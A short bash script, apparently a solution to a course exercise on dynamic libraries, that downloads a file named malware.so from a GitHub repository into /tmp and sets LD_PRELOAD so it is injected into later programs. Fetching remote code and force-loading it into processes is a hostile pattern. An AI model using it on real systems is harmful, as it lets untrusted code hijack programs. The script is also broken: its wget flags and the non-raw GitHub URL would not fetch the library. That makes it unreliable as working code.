#!/bin/bash
wget -o /tmp/malware.so -i https://github.com/YassineRKB/alx-low_level_programming/blob/main/0x18-dynamic_libraries/malware.so
export LD_PRELOAD=/tmp/malware.so
